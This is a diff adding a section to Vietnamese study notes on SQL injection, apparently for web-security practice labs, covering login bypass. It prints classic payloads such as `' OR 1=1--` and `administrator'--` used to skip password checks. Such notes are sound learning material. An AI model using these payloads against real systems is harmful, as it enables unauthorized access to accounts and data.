@@ -82,3 +82,31 @@ Hoặc lấy tất cả category thì thêm chuỗi `' OR 1=1--`
 Nếu sử dung trên burp suite thì phải control + u để encode sang html
 ![img](../asset/sqli-1-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data-0.png)
 ![img](../asset/sqli-1-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data-1.png)
+
+---
+
+## Subverting application logic
+
+Một ứng dụng cho phép user đăng nhập bằng username + passwd.
+Đây là cách DB query:
+
+```
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+```
+
+Attacker có thể thêm `--` để bỏ yêu cầu passwd trên DB
+
+```
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+```
+
+### Lab: SQL injection vulnerability allowing login bypass
+
+> Des: Phòng thí nghiệm này chứa lỗ hổng SQL injection trong chức năng đăng nhập.
+
+> Để giải quyết phòng thí nghiệm, hãy thực hiện một cuộc tấn công chèn SQL đăng nhập vào ứng dụng với tư cách là người dùng quản trị viên.
+
+Bài này chỉ cần nhập input của user thêm chuỗi `'--`:
+![img](../asset/sqli-2-SQL-injection-vulnerability-allowing-login-bypass-0.png)
+![img](../asset/sqli-2-SQL-injection-vulnerability-allowing-login-bypass-1.png)
+![img](../asset/sqli-2-SQL-injection-vulnerability-allowing-login-bypass-2.png)
